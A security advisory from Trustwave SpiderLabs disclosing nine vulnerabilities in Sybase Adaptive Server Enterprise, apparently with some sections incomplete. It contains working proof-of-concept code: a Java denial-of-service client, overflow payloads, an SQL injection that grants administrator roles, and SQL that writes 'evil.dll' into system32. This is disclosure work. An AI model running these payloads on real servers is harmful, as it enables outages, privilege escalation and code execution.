Trustwave SpiderLabs Security Advisory TWSL2013-035:
Multiple Vulnerabilities in Sybase Adaptive Server Enterprise
Published: 01/03/13
Version: 1.0
Vendor: Sybase
Product: Adaptive Server Enterprise (ASE)
Product description:
Relational database management system for UNIX, Linux, and Microsoft Windows platforms.
Finding 1: Denial of service via the hacmpmsgxchg built-in procedure.
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6867
CWE: CWE-20
Affected versions: Sybase ASE 15.7
Any valid database user can cause denial of service via invocation of the
hacmpmsgxchg built-in procedure with missing parameters: as a result the server process dies.
Example:
/\*
\* Adjust credentials and target host information in the code
\*
\* Compile with:
\* javac SSN1893561.java
\* Run with (copy jconn4.jar to current directory from Sybase ASE installation):
\* java -cp jconn4.jar:. SSN1893561
\*/
import java.sql.\*;
import java.util.Properties;
public class SSN1893561 {
// Adjust this information
private static String username = "DB\_USER";
private static String password = "DB\_PASSWORD";
private static String hostname = "192.168.1.1";
private static String rpc\_name = "hacmpmsgxchg";
private static int ha\_cmpgrantrevrole = 109;
public static void main(String args[]) throws InstantiationException, ClassNotFoundException, IllegalAccessException, SQLException {
Properties props = new Properties();
props.put("user", username);
props.put("password", password);
String url = "jdbc:sybase:Tds:" + hostname + ":5000";
Driver sybdriver = (Driver) Class.forName("com.sybase.jdbc4.jdbc.SybDriver").newInstance();
DriverManager.registerDriver(sybdriver);
Connection conn = DriverManager.getConnection(url, props);
CallableStatement callablestatement = conn.prepareCall((new StringBuilder()).append("{?=call $").append(rpc\_name).append("(?, ?)}").toString());
byte[] message = new byte[2048];
for (int i = 0; i < message.length; i++) {
message[i] = 0x41;
}
callablestatement.setBytes(2, message);
callablestatement.setInt(3, ha\_cmpgrantrevrole);
callablestatement.executeUpdate();
System.out.println("Done.");
}
}

Finding 2: Denial of service via the ssl\_admin built-in function
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6862
CWE: CWE-20
Affected versions: Sybase ASE 15.0, 15.5 and 15.7
Any valid database user can supply an overly long argument to the ssl\_admin
built-in function thus causing denial of service condition: as a result the
server process dies.
Example:
-- Denial of service via built-in function
select ssl\_admin(replicate('A', 80), 'a', '3', 0)
Vendor Status:

Finding 3: File creation via the TRANSFER TABLE command
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6864
CWE: CWE-285
Affected versions: Sybase ASE 15.0.3 and later
Any valid database user can create arbitrary files on the database server
filesystem via the TRANSFER TABLE command. One possible scenario is to
replace existing libraries and then trigger the server to load modified
versions thus executing arbitrary code in the server's process context.
Example:
-- TRANSFER FILE command file creation/overwrite example
use tempdb
go
create table mydlltable (val binary(10))
go
insert into mydlltable values (0x00112233445566778899)
go
-- This creates evil.dll under %SystemRoot%\system32 on Windows 32-bit box
transfer table mydlltable to 'evil.dll' for bcp
go
drop table mydlltable
go
Vendor Status:
Vendor was contacted and a patch was released.

Finding 4: Buffer overflow in the set\_password built-in function
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6865
CWE: CWE-20
Affected versions: Sybase ASE 15.0.3 and later.
Any valid database user can supply an overly long argument to the
set\_password built-in function thus causing stack-based buffer overflow.
This may allow to execute arbitrary code in the server's process context.
Example:
-- set\_password built-in function stack-based buffer overflow
declare @pwd varbinary(8000)
select @pwd = 0x43444546474800 + REPLICATE(0x41, 7000)
select set\_password('DB\_PASSWORD', @pwd, null)
select set\_password(@pwd, 'DB\_PASSWORD', null)
go
Vendor Status:
Vendor was contacted and a patch was released.
Remediation Steps:

Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6863
CWE: CWE-89
Affected versions: Sybase ASE 15.0.3 and later.
Any valid database user can elevate privileges via specially crafted UPDATE
STATISTICS command. The command is vulnerable to SQL injection attack: it
allows users to execute SQL code with the highest privileges possible.
Example:
-- SQL injection via the UPDATE STATISTICS command
-- Grants sa\_role, sso\_role server roles to login 'DB\_USER'
-- Prerequisite: sp\_configure 'max parallel degree', 8
use tempdb
go
create table [sysobjects grant role sa\_role, sso\_role to DB\_USER--](id int)
go
alter table [sysobjects grant role sa\_role, sso\_role to DB\_USER--] partition 2
go
update statistics [sysobjects grant role sa\_role, sso\_role to DB\_USER--] with sampling = 10 percent, calibrate = 1
go

Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6859
CWE: CWE-285
Affected versions: Sybase ASE 15.0, 15.5 and 15.7
Any valid user can grant himself or any other user 'sa\_role' fixed server
role via the hacmpmsgxchg built-in procedure invocation.
Example:
/\*
\* Adjust credentials, target host information and suid in the code
\*
\* Compile with:
\* javac SSN1849356.java
\* Run with (copy jconn4.jar to current directory from Sybase ASE installation):
\* java -cp jconn4.jar:. SSN1849356
\*
\* Examine the login roles after with sp\_displaylogin
\*/
import java.sql.\*;
import java.util.Properties;
public class SSN1849356 {

Finding 7: Information disclosure through installation log files on Windows platforms
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6861
CWE: CWE-200
Affected versions: Sybase ASE 15.0.3 and later
Installation log files contain cleartext password used for built-in
'sa' account during installation or upgrade of the server. On Windows
platform the log files are publicly readable.
Example:
After the initial SAP Sybase ASE 15.7 installation, examine the log files
under %SYBASE%\ASE-15\_0\init\logs\ (publicly readable on Windows
platforms): the Job Scheduler configuration step log file contains the
initial 'sa' password.
The following can be found in the log file:
12/05/12 01:08:42 PM SQL command: if not exists(select name from
master.dbo.syslogins where name = 'sa')
begin
exec sp\_addlogin sa, 'DB\_PASSWORD'
exec sp\_adduser sa, sa
end
12/05/12 01:08:42 PM SQL command: exec sp\_role 'grant', sa\_role, sa
exec sp\_role 'grant', js\_admin\_role, sa
Vendor Status:

Finding 8: Buffer overflow in the config\_admin built-in function
Credit: Vladimir Zakharevich of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-6245
CWE: CWE-20
Affected versions: Sybase ASE 15.0, 15.5 and 15.7
One of the SAP Sybase ASE built-in functions fails to validate input,
resulting in a buffer overflow condition allowing to execute arbitrary code
by any valid database user in the server's process context.
Example:
declare @cch varbinary(16380)
select @cch = 0x4141414144444400 + REPLICATE('A', 268) + 0x55565758 + REPLICATE('B', 10) + 0x00000000000000000000 + 0x1300 + REPLICATE('C', 16042)
select config\_admin(28, 1,0, 0, NULL, @cch)
go
Vendor Status:
Vendor was contacted and a patch was released.
Remediation Steps:
No workarounds are currently available. Apply one of these following vendor
supplied patches:

Finding 9: Unauthenticated remote backup vulnerability
Credit: Martin Rakhmanov of Trustwave (formerly Application Security Inc)
CVE: CVE-2013-7245
CWE: CWE-285
Versions of Sybase ASE 15.7 prior to SP51 allow unauthenticated users
perform remote backup operations and thus gain access to the database. The
backup Server does not validate credentials of the backup command
requestor. In SP51 for Sybase ASE 15.7 SAP introduced IP address validation
to limit vulnerability exposure.
Example:
Attacker adds an entry to his interfaces file to point to a remote backup
server and issues the BACKUP command with UNC path as destination.
Provided that the target Sybase ASE can access the UNC location, the
database backup will be stored on location of attacker's choice. No
permissions are checked for that.
Vendor Status:
Vendor was contacted and a patch was released.
Remediation Steps:
Apply one of these following vendor supplied patches:
Sybase ASE 15.7: apply SP51
As a workaround, the firewall should protect the backup server port from
remote connections.
